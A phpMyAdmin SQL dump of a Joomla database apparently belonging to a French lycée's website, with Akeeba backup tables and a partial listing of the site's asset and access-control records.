-- phpMyAdmin SQL Dump
-- version 4.1.4
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Jun 23, 2016 at 02:49 PM
-- Server version: 5.6.15-log
-- PHP Version: 5.5.8

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `dbjoomlatest`
--

-- --------------------------------------------------------

--
-- Table structure for table `jos_ak_profiles`
--

CREATE TABLE IF NOT EXISTS `jos_ak_profiles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `description` varchar(255) NOT NULL,
  `configuration` longtext,
  `filters` longtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_ak_profiles`
--

INSERT INTO `jos_ak_profiles` (`id`, `description`, `configuration`, `filters`) VALUES
(1, 'Default Backup Profile', '###AES128###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', '');

-- --------------------------------------------------------

--
-- Table structure for table `jos_ak_stats`
--

CREATE TABLE IF NOT EXISTS `jos_ak_stats` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `description` varchar(255) NOT NULL,
  `comment` longtext,
  `backupstart` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `backupend` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `status` enum('run','fail','complete') NOT NULL DEFAULT 'run',
  `origin` varchar(30) NOT NULL DEFAULT 'backend',
  `type` varchar(30) NOT NULL DEFAULT 'full',
  `profile_id` bigint(20) NOT NULL DEFAULT '1',
  `archivename` longtext,
  `absolute_path` longtext,
  `multipart` int(11) NOT NULL DEFAULT '0',
  `tag` varchar(255) DEFAULT NULL,
  `filesexist` tinyint(3) NOT NULL DEFAULT '1',
  `remote_filename` varchar(1000) DEFAULT NULL,
  `total_size` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_fullstatus` (`filesexist`,`status`),
  KEY `idx_stale` (`status`,`origin`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `jos_ak_stats`
--

INSERT INTO `jos_ak_stats` (`id`, `description`, `comment`, `backupstart`, `backupend`, `status`, `origin`, `type`, `profile_id`, `archivename`, `absolute_path`, `multipart`, `tag`, `filesexist`, `remote_filename`, `total_size`) VALUES
(1, 'Premiere backup - samedi 20 octobre 2012 18:05', '', '2012-10-20 14:05:26', '2012-10-20 14:06:17', 'complete', 'backend', 'full', 1, 'site-lyceemaximiliensorre.fr-20121020-180526.jpa', '/homez.547/maximilik/www/administrator/components/com_akeeba/backup/site-lyceemaximiliensorre.fr-20121020-180526.jpa', 1, 'backend', 1, NULL, 11385694),
(2, 'Backup taken on vendredi 5 avril 2013 18:00', '', '2013-04-05 14:00:58', '2013-04-05 14:02:10', 'complete', 'backend', 'full', 1, 'site-www.lyceemaximiliensorre.fr-20130405-180058.jpa', '/homez.547/maximilik/www/administrator/components/com_akeeba/backup/site-www.lyceemaximiliensorre.fr-20130405-180058.jpa', 1, 'backend', 1, NULL, 13307083);

-- --------------------------------------------------------

--
-- Table structure for table `jos_ak_storage`
--

CREATE TABLE IF NOT EXISTS `jos_ak_storage` (
  `tag` varchar(255) NOT NULL,
  `lastupdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `data` longtext,
  PRIMARY KEY (`tag`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_assets`
--

CREATE TABLE IF NOT EXISTS `jos_assets` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set parent.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `level` int(10) unsigned NOT NULL COMMENT 'The cached level in the nested tree.',
  `name` varchar(50) NOT NULL COMMENT 'The unique name for the asset.\n',
  `title` varchar(100) NOT NULL COMMENT 'The descriptive title for the asset.',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_asset_name` (`name`),
  KEY `idx_lft_rgt` (`lft`,`rgt`),
  KEY `idx_parent_id` (`parent_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=162 ;

--
-- Dumping data for table `jos_assets`
--

INSERT INTO `jos_assets` (`id`, `parent_id`, `lft`, `rgt`, `level`, `name`, `title`, `rules`) VALUES
(1, 0, 1, 674, 0, 'root.1', 'Root Asset', '{"core.login.site":{"6":1,"2":1},"core.login.admin":{"6":1},"core.login.offline":[],"core.admin":{"8":1},"core.manage":{"7":1},"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(2, 1, 1, 2, 1, 'com_admin', 'com_admin', '{}'),
(3, 1, 3, 32, 1, 'com_banners', 'com_banners', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(4, 1, 33, 34, 1, 'com_cache', 'com_cache', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(5, 1, 35, 36, 1, 'com_checkin', 'com_checkin', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(6, 1, 37, 38, 1, 'com_config', 'com_config', '{}'),
(7, 1, 39, 42, 1, 'com_contact', 'com_contact', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(8, 1, 43, 278, 1, 'com_content', 'com_content', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":[],"core.edit":{"4":1},"core.edit.state":{"5":1},"core.edit.own":[]}'),
(9, 1, 279, 280, 1, 'com_cpanel', 'com_cpanel', '{}'),
(10, 1, 281, 282, 1, 'com_installer', 'com_installer', '{"core.admin":{"7":1},"core.manage":{"7":1},"core.delete":[],"core.edit.state":[]}'),
(11, 1, 283, 284, 1, 'com_languages', 'com_languages', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(12, 1, 285, 286, 1, 'com_login', 'com_login', '{}'),
(13, 1, 287, 288, 1, 'com_mailto', 'com_mailto', '{}'),
(14, 1, 289, 290, 1, 'com_massmail', 'com_massmail', '{}'),
(15, 1, 291, 292, 1, 'com_media', 'com_media', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":{"5":1}}'),
(16, 1, 293, 294, 1, 'com_menus', 'com_menus', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(17, 1, 295, 296, 1, 'com_messages', 'com_messages', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(18, 1, 297, 298, 1, 'com_modules', 'com_modules', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(19, 1, 299, 302, 1, 'com_newsfeeds', 'com_newsfeeds', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(20, 1, 303, 304, 1, 'com_plugins', 'com_plugins', '{"core.admin":{"7":1},"core.manage":[],"core.edit":[],"core.edit.state":[]}'),
(21, 1, 305, 306, 1, 'com_redirect', 'com_redirect', '{"core.admin":{"7":1},"core.manage":[]}'),
(22, 1, 307, 308, 1, 'com_search', 'com_search', '{"core.admin":{"7":1},"core.manage":{"6":1}}'),
(23, 1, 309, 310, 1, 'com_templates', 'com_templates', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(24, 1, 311, 312, 1, 'com_users', 'com_users', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.own":{"6":1},"core.edit.state":[]}'),
(25, 1, 313, 316, 1, 'com_weblinks', 'com_weblinks', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":[],"core.edit":{"4":1},"core.edit.state":{"5":1},"core.edit.own":[]}'),
(26, 1, 317, 318, 1, 'com_wrapper', 'com_wrapper', '{}'),
(27, 8, 44, 61, 2, 'com_content.category.2', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(28, 3, 4, 5, 2, 'com_banners.category.3', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(29, 7, 40, 41, 2, 'com_contact.category.4', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(30, 19, 300, 301, 2, 'com_newsfeeds.category.5', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(31, 25, 314, 315, 2, 'com_weblinks.category.6', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(32, 8, 62, 117, 2, 'com_content.category.7', 'Sample Pages', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(33, 32, 63, 64, 3, 'com_content.article.1', 'Meet the Staff', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(34, 32, 65, 66, 3, 'com_content.article.2', 'Nos formations', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(35, 32, 67, 68, 3, 'com_content.article.3', 'Facilities', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(36, 32, 69, 70, 3, 'com_content.article.4', 'L''actualité de votre lycée', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(37, 32, 71, 72, 3, 'com_content.article.5', 'Locations', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(38, 32, 73, 80, 3, 'com_content.category.8', 'Accueil', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(39, 38, 74, 75, 4, 'com_content.article.6', 'UN LYCÉE', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(40, 38, 76, 77, 4, 'com_content.article.7', 'des formations', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(41, 38, 78, 79, 4, 'com_content.article.8', 'actualités', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(42, 32, 81, 86, 3, 'com_content.category.9', 'des formations', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(43, 42, 82, 83, 4, 'com_content.article.9', 'The best of professionals', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(44, 42, 84, 85, 4, 'com_content.article.10', 'Free Consultation', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(45, 32, 87, 92, 3, 'com_content.category.10', 'Facilities', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(46, 45, 88, 89, 4, 'com_content.article.11', 'le Lycée', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(47, 45, 90, 91, 4, 'com_content.article.12', 'Training Facility', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(48, 32, 93, 94, 3, 'com_content.article.13', 'Privacy Policy', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(49, 32, 95, 96, 3, 'com_content.article.14', 'Nunc quis est id nisi', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(50, 32, 97, 98, 3, 'com_content.article.15', 'Ut at lorem ante', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(51, 32, 99, 100, 3, 'com_content.article.16', 'Aliquam consequat', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(52, 32, 101, 102, 3, 'com_content.article.17', 'Suspendisse adipiscing', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(55, 77, 145, 146, 3, 'com_content.article.19', 'historique', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(53, 32, 103, 104, 3, 'com_content.article.18', 'Principal notes (2)', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(54, 1, 672, 673, 1, 'com_akeeba', 'akeeba', '{}'),
(56, 77, 147, 148, 3, 'com_content.article.20', 'restauration', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(57, 32, 105, 106, 3, 'com_content.article.21', 'Pré-Bac', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(58, 27, 45, 46, 3, 'com_content.article.22', 'Etudes post-Bac', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(59, 27, 47, 48, 3, 'com_content.article.23', 'Etudes post-Bts', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(60, 27, 49, 50, 3, 'com_content.article.24', 'Formation en alternance', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(61, 27, 51, 52, 3, 'com_content.article.25', 'Formation Continue', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(62, 8, 118, 125, 2, 'com_content.category.11', 'CDI', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(63, 62, 119, 120, 3, 'com_content.article.26', 'Présentation du CDI', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(64, 27, 53, 54, 3, 'com_content.article.27', ' Accès et règles d''utilisation', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(65, 27, 55, 56, 3, 'com_content.article.28', 'Objectifs', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(66, 62, 121, 122, 3, 'com_content.article.29', 'Prêts', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(67, 62, 123, 124, 3, 'com_content.article.30', 'Liens CDI', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(68, 8, 126, 143, 2, 'com_content.category.12', 'vie scolaire', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(69, 68, 139, 140, 3, 'com_content.article.31', 'Les C.P.E.', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(70, 68, 137, 138, 3, 'com_content.article.32', 'L''infirmerie', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(71, 68, 127, 128, 3, 'com_content.article.33', ' L''assistante sociale', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(72, 68, 129, 130, 3, 'com_content.article.34', 'Dispositifs de soutien', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(73, 68, 131, 132, 3, 'com_content.article.35', 'Orientation', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(74, 68, 133, 134, 3, 'com_content.article.36', 'Association sportive', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(75, 68, 135, 136, 3, 'com_content.article.37', 'Association de parents d''élèves', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(76, 27, 57, 58, 3, 'com_content.article.38', 'Liens', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(77, 8, 144, 149, 2, 'com_content.category.13', 'un lycee', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(78, 27, 59, 60, 3, 'com_content.article.39', 'Administration', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(79, 32, 113, 114, 3, 'com_content.article.40', 'Pré-Bac (seconde, première et terminale)', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(80, 84, 153, 154, 3, 'com_content.article.41', 'seconde homogène', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(81, 84, 155, 156, 3, 'com_content.article.42', 'BTS, CPGE, DCG   ', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(82, 84, 157, 158, 3, 'com_content.article.43', 'DCG 2ème et 3ème année   ', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(83, 84, 151, 152, 3, 'com_content.article.44', 'Conseillères en ESF', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(84, 8, 150, 159, 2, 'com_content.category.14', 'procedure inscription', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(85, 8, 160, 175, 2, 'com_content.category.15', 'actualités', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(86, 85, 169, 170, 3, 'com_content.article.45', 'Calendrier 2013-2014', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(87, 85, 167, 168, 3, 'com_content.article.46', 'Conseils de classe pré-Bac', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(88, 85, 165, 166, 3, 'com_content.article.47', 'FSE 2012-2013', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(89, 85, 163, 164, 3, 'com_content.article.48', 'Remise des diplômes du Baccalauréat', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(90, 85, 161, 162, 3, 'com_content.article.49', 'Demi-journée banalisée du 15 novembre', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(91, 32, 115, 116, 3, 'com_content.article.50', 'Les sections de BTS', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(92, 85, 171, 172, 3, 'com_content.article.51', 'VOYAGE A LIVERPOOL', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(93, 68, 141, 142, 3, 'com_content.article.52', 'LES HORAIRES', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(94, 85, 173, 174, 3, 'com_content.article.53', 'Venez retirer vos diplômes (BAC et BTS)', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(95, 32, 107, 108, 3, 'com_content.article.54', 'Équipe de direction', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(96, 32, 109, 110, 3, 'com_content.article.55', 'Les personnels', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(97, 32, 111, 112, 3, 'com_content.article.56', 'Notre force, nos résultats', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(98, 8, 176, 183, 2, 'com_content.category.16', 'Test', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(99, 98, 177, 178, 3, 'com_content.article.57', 'Lorem Ipsum', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(100, 98, 179, 180, 3, 'com_content.article.58', 'Bidule', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(101, 98, 181, 182, 3, 'com_content.article.59', '&nbsp', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(102, 8, 184, 197, 2, 'com_content.category.17', 'Lycee', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(103, 8, 198, 219, 2, 'com_content.category.18', 'Formation', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(104, 8, 220, 239, 2, 'com_content.category.19', 'Actualité', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(105, 102, 191, 192, 3, 'com_content.article.60', 'Déscription du lycée', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(106, 103, 215, 216, 3, 'com_content.article.61', 'Formations', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(107, 104, 231, 232, 3, 'com_content.article.62', 'Dernières actualités', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(108, 8, 240, 241, 2, 'com_content.category.20', 'contact', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(112, 104, 225, 230, 3, 'com_content.category.21', 'Actualités AS', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(109, 112, 226, 227, 4, 'com_content.article.63', 'Test article posté', '{"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(110, 104, 221, 222, 3, 'com_content.article.64', 'dgbjsfmlhjm', ''),
(111, 104, 223, 224, 3, 'com_content.article.65', 'fhndfh', ''),
(113, 102, 185, 186, 3, 'com_content.article.66', 'Les Points Forts', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(114, 102, 187, 188, 3, 'com_content.article.67', 'Résultats', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(115, 102, 189, 190, 3, 'com_content.category.22', 'Histoire', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(116, 103, 199, 200, 3, 'com_content.category.23', 'Pré-bac', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(117, 103, 201, 206, 3, 'com_content.category.24', 'BTS', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(118, 103, 207, 212, 3, 'com_content.category.25', 'CPGE', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(119, 103, 213, 214, 3, 'com_content.category.26', 'Autres formations', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(120, 117, 202, 203, 4, 'com_content.article.68', 'Test bts 1', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(121, 117, 204, 205, 4, 'com_content.article.69', 'Test bts 2', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(122, 118, 208, 209, 4, 'com_content.article.70', 'Test prépa 1', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(123, 118, 210, 211, 4, 'com_content.article.71', 'Test prépa 2', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(124, 112, 228, 229, 4, 'com_content.article.72', 'Test autres', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(125, 8, 242, 243, 2, 'com_content.category.27', 'Accueil', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(126, 102, 193, 194, 3, 'com_content.category.28', 'Personnel', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(137, 127, 271, 272, 3, 'com_content.category.39', 'Intendance', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(127, 8, 244, 277, 2, 'com_content.category.29', 'Vie scolaire', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(128, 127, 245, 264, 3, 'com_content.category.30', 'Associations sportives', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(129, 127, 269, 270, 3, 'com_content.category.31', 'CDI', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(130, 103, 217, 218, 3, 'com_content.category.32', 'Orientation', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
